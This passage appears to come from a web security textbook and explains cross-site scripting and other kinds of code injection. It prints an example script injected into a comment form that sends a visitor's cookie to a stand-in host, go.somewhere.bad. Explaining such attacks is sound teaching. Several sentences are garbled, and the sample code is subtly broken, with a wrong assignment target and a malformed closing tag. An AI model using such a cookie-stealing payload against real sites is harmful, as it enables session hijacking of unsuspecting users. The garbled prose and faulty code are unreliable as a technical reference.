# Malicious Code Injection

One type of attack has been particularly effective over the years the web is with called code injection. The well known of these is Cross Site Scripting (known as XSS), so as not to be confused with Cascading Style Sheets—CSS). While particularly troubling about these attacks is that some sort of code executes, causing varying degrees of information loss or redirection of users, without their even noticing it.

Cross Site Scripting basically works as follows:

+   1. The malicious user, in a form that will turn around and display to other people the input it was given (such as a comment entry or message board entry), enters text that not only represents the message they want to tell, but some script to execute on the client, such as the following:
```html
<script type="text/javascript">
this.document = "go.somewhere.bad?cookie=" + this.cookie;
</script type="text/javascript">
```

+   2. The malicious user then submits the form and waits.
3. The user of the system who goes to view the page that contains that text entered by the malicious user will execute the script code was entered. In our simple example, the user will be redirected, along with any cookie information from the originating site.

Although this is a trivial example, the possibilities of what can be done with an XSS attack are very wide.

There are other forms of malicious code injection. For example, we talked in depth SQL injection attacks in the last section of this book.

It's also possible to take advantage of vulnerabilities in your code, your installed applications, or your configuration to upload arbitrary code to run on your web server, leading to a compromised web server. We discuss this in the next section.
